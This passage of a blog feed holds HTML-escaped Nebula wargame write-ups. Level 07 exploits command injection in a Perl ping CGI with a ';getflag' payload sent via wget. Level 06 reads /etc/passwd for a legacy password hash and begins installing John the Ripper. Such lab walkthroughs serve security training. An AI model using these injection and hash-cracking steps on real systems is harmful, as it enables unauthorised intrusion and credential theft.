+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	print(&quot;&amp;lt;html&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	@output = `ping -c 3 $&lt;/span&gt;host 2&amp;gt;&amp;amp;1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;	foreach $&lt;/span&gt;line &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@output&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; print &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	print(&quot;&amp;lt;/pre&amp;gt;&lt;/span&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;span class=&quot;s2&quot;&gt;&quot;);
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+}
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;Host set. &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;not, display normal page, etc
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;ping(param(&quot;Host&quot;));&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;And.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;thttpd.conf
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; /etc/thttpd/thttpd.conf: thttpd configuration file
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; This file is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;thttpd processes created by /etc/init.d/thttpd.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Commentary is based closely on the thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.25b manpage, by Jef Poskanzer.
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies an alternate port number to listen on.
+&lt;span class=&quot;go&quot;&gt;port=7007
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a directory to chdir&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; to at startup. This is merely a convenience -
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; you could just as easily &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;a &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the shell script that invokes the program.
+&lt;span class=&quot;go&quot;&gt;dir=/home/flag07
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Do a &lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; at initialization &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;, restricting file access to the program&lt;span class=&quot;s1&quot;&gt;'s
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;current directory. If chroot is the compiled-in default (not the case on
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;Debian), then nochroot disables it. See thttpd(8) for details.
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;nochroot
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chroot&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a directory to chdir&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; to after chrooting. If you&lt;span class=&quot;s1&quot;&gt;'re not chrooting,
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;you might as well do a single chdir() with the dir option. If you are
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;chrooting, this lets you put the web files in a subdirectory of the chroot
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;tree, instead of in the top level mixed in with the chroot files.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;data_dir=
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Don&lt;span class=&quot;s1&quot;&gt;'t do explicit symbolic link checking. Normally, thttpd explicitly expands
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;any symbolic links in filenames, to check that the resulting path stays within
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;the original document tree. If you want to turn off this check and save some
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;CPU time, you can use the nosymlinks option, however this is not
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;recommended. Note, though, that if you are using the chroot option, the
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;symlink checking is unnecessary and is turned off, so the safe way to save
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;those CPU cycles is to use chroot.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;symlinks
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;nosymlinks
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Do el-cheapo virtual hosting. If vhost is the compiled-in default &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not the
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; on Debian&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;novhost disables it. See thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;vhost
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;novhost
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Use a global passwd file. This means that every file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the entire document
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; tree is protected by the single .htpasswd file at the top of the tree.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Otherwise the semantics of the .htpasswd file are the same. If this option is
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;but there is no .htpasswd file &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the top-level directory, &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;thttpd
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; proceeds as &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the option was not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; - first looking &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt; .htpasswd
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; file, and &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;that doesn&lt;span class=&quot;s1&quot;&gt;'t exist either then serving the file without any
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;password. If globalpasswd is the compiled-in default (not the case on Debian),
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;then noglobalpasswd disables it.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;globalpasswd
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;noglobalpasswd
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies what user to switch to after initialization when started as root.
+&lt;span class=&quot;go&quot;&gt;user=flag07
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a wildcard pattern &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CGI programs, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;instance &lt;span class=&quot;s2&quot;&gt;&quot;**.cgi&quot;&lt;/span&gt; or
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/cgi-bin/*&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; See thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+&lt;span class=&quot;go&quot;&gt;cgipat=**.cgi
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a file of throttle settings. See thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;throttles&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/thttpd/throttle.conf
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a &lt;span class=&quot;nb&quot;&gt;hostname &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;to, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;multihoming. The default is to &lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;to
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; all hostnames supported on the &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;machine. See thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;logging. If no logfile option is specified, thttpd logs
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; via syslog&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; If &lt;span class=&quot;nv&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null is specified, thttpd doesn&lt;span class=&quot;s1&quot;&gt;'t log at all.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;logfile=/var/log/thttpd.log
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a file to write the process-id to. If no file is specified, no
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; process-id is written. You can use this file to send signals to thttpd. See
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; thttpd&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pidfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies the character &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to use with text MIME types.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies a P3P server privacy header to be returned with all responses. See
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; http://www.w3.org/P3P/ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details. Thttpd doesn&lt;span class=&quot;s1&quot;&gt;'t do anything at all with the
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;string except put it in the P3P: response header.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;p3p=
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; Specifies the number of seconds to be used &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a &lt;span class=&quot;s2&quot;&gt;&quot;Cache-Control: max-age&quot;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; header to be returned with all responses. An equivalent &lt;span class=&quot;s2&quot;&gt;&quot;Expires&quot;&lt;/span&gt; header is
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; also generated. The default is no Cache-Control or Expires headers, which is
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; just fine &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;most sites.
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;max_age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;index.cgi informations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ping(param(“Host”)); ⇒ We have to provide a GET parameter called “Host” to out request to index.cgi perl script.&lt;/li&gt;
+  &lt;li&gt;@output = ping -c 3 $host 2&amp;gt;&amp;amp;1; ⇒ The GET parameter “Host” is used without any sanitisation checks directly at this line in $host.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;⇒ Command Injection! But where?&lt;/p&gt;
+
+&lt;p&gt;thttpd.conf informations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;/etc/thttpd/thttpd.conf: thttpd configuration file ⇒ The config file of our web server (thttpd)!&lt;/li&gt;
+  &lt;li&gt;port=7007 ⇒ The port where our web server is listening!&lt;/li&gt;
+  &lt;li&gt;cgipat=**.cgi ⇒ Is interpreting perl scripts! This is getting so easy…​ I just need…​&lt;/li&gt;
+  &lt;li&gt;user=flag07 ⇒ The web service is running with our target account!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;⇒ We have to inject getflag for our webserver on port 7007 using index.cgi (the perl script).&lt;/p&gt;
+
+&lt;p&gt;Let’s do it!!!&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt; wget http://127.0.0.1:7007/index.cgi?Host&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%3Bgetflag
+&lt;span class=&quot;go&quot;&gt;--2017-10-06 04:25:18--  http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag
+Connecting to 127.0.0.1:7007... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;index.cgi?Host=;&lt;/span&gt;getflag: Permission denied
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Cannot write to `index.cgi?Host=;&lt;/span&gt;getflag&lt;span class=&quot;s1&quot;&gt;' (Permission denied).
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well in the above command I am using wget (Web Get) to retrieve the response in html from my web server on localhost port 7007. But, I am trying to write in the wrong folder. The grand final:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:/home/flag07$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
+&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt; wget http://127.0.0.1:7007/index.cgi?Host&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%3Bgetflag
+&lt;span class=&quot;go&quot;&gt;--2017-10-24 07:40:31--  http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag
+Connecting to 127.0.0.1:7007... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Saving to: `index.cgi?Host=;&lt;/span&gt;getflag&lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;    [ &amp;lt;=&amp;gt;&lt;/span&gt;                                                                                                                                                               &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 136         &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-K/s   &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.006s
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;2017-10-24 07:40:31 (22.7 KB/s) - `index.cgi?Host=;&lt;/span&gt;getflag&lt;span class=&quot;s1&quot;&gt;' saved [136]
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 11
+drwxr-x--- 1 level07 level07   80 Oct 24 07:40 .
+drwxr-xr-x 1 root    root      80 Aug 27  2012 ..
+-rw-r--r-- 1 level07 level07  220 May 18  2011 .bash_logout
+-rw-r--r-- 1 level07 level07 3353 May 18  2011 .bashrc
+drwx------ 2 level07 level07   60 Oct 24 07:38 .cache
+-rw------- 1 level07 level07   41 Aug 18  2012 .lesshst
+-rw-r--r-- 1 level07 level07  675 May 18  2011 .profile
+-rw------- 1 level07 level07  711 Aug 18  2012 .viminfo
+-rw-rw-r-- 1 level07 level07   77 Aug 18  2012 index.cgi
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;-rw-rw-r-- 1 level07 level07  136 Oct 24 07:40 index.cgi?Host=;&lt;/span&gt;getflag
+&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;index.cgi&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;Host&lt;span class=&quot;se&quot;&gt;\=\;&lt;/span&gt;getflag
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;You have successfully executed getflag on a target account
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;span class=&quot;gp&quot;&gt;level07@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="nebula" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Exploit Exercises: Nebula Level 06</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-06/" rel="alternate" type="text/html" title="Exploit Exercises: Nebula Level 06" />
+      
+      <published>2018-07-16T15:48:00-03:00</published>
+      <updated>2018-07-16T15:48:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-06</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-06/">&lt;p&gt;&lt;img src=&quot;/uploads/Screenshot%20from%202018-07-16%2000-20-16.png&quot; alt=&quot;Image of Nebula Terminal&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The flag06 account credentials came from a legacy unix system.
+To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source code&lt;/h3&gt;
+
+&lt;p&gt;There is no source code available for this level.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Well this exercises is so easy that I do not know why am I writing it anymore. Our first, and final hint, was: “The flag06 account credentials came from a legacy unix system.” In other words let’s see what we have in /etc/passwd or /etc/shadow.&lt;/p&gt;
+
+&lt;p&gt;/etc/shadow:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;level06@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/shadow
+&lt;span class=&quot;go&quot;&gt;cat: /etc/shadow: Permission denied
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level06@nebula:~$&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;Of course, we do not have any kind of permission on /etc/shadow system file.
+/etc/passwd:
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level06@nebula:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
+&lt;span class=&quot;go&quot;&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:104::/var/run/dbus:/bin/false
+nebula:x:1000:1000:nebula,,,:/home/nebula:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+level00:x:1001:1001::/home/level00:/bin/sh
+flag00:x:999:999::/home/flag00:/bin/sh
+level01:x:1002:1002::/home/level01:/bin/sh
+flag01:x:998:998::/home/flag01:/bin/sh
+level02:x:1003:1003::/home/level02:/bin/sh
+flag02:x:997:997::/home/flag02:/bin/sh
+level03:x:1004:1004::/home/level03:/bin/sh
+flag03:x:996:996::/home/flag03:/bin/sh
+level04:x:1005:1005::/home/level04:/bin/sh
+flag04:x:995:995::/home/flag04:/bin/sh
+level05:x:1006:1006::/home/level05:/bin/sh
+flag05:x:994:994::/home/flag05:/bin/sh
+level06:x:1007:1007::/home/level06:/bin/sh
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+level07:x:1008:1008::/home/level07:/bin/sh
+flag07:x:992:992::/home/flag07:/bin/sh
+level08:x:1009:1009::/home/level08:/bin/sh
+flag08:x:991:991::/home/flag08:/bin/sh
+level09:x:1010:1010::/home/level09:/bin/sh
+flag09:x:990:990::/home/flag09:/bin/sh
+level10:x:1011:1011::/home/level10:/bin/sh
+flag10:x:989:989::/home/flag10:/bin/sh
+level11:x:1012:1012::/home/level11:/bin/sh
+flag11:x:988:988::/home/flag11:/bin/sh
+level12:x:1013:1013::/home/level12:/bin/sh
+flag12:x:987:987::/home/flag12:/bin/sh
+level13:x:1014:1014::/home/level13:/bin/sh
+flag13:x:986:986::/home/flag13:/bin/sh
+level14:x:1015:1015::/home/level14:/bin/sh
+flag14:x:985:985::/home/flag14:/bin/sh
+level15:x:1016:1016::/home/level15:/bin/sh
+flag15:x:984:984::/home/flag15:/bin/sh
+level16:x:1017:1017::/home/level16:/bin/sh
+flag16:x:983:983::/home/flag16:/bin/sh
+level17:x:1018:1018::/home/level17:/bin/sh
+flag17:x:982:982::/home/flag17:/bin/sh
+level18:x:1019:1019::/home/level18:/bin/sh
+flag18:x:981:981::/home/flag18:/bin/sh
+level19:x:1020:1020::/home/level19:/bin/sh
+flag19:x:980:980::/home/flag19:/bin/sh
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;level06@nebula:~$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Jakpot! We got “flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh”, meaning we got the hash of the password of the flag06 account. How we actually retrieve the password of the flag06 account? Simple:&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;nli@mysystem:~$&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;john
+&lt;span class=&quot;go&quot;&gt;Fetched 4.447 kB in 2s (1.649 kB/s)
+Selecting previously unselected package john-data.
+(Reading database ... 407903 files and directories currently installed.)
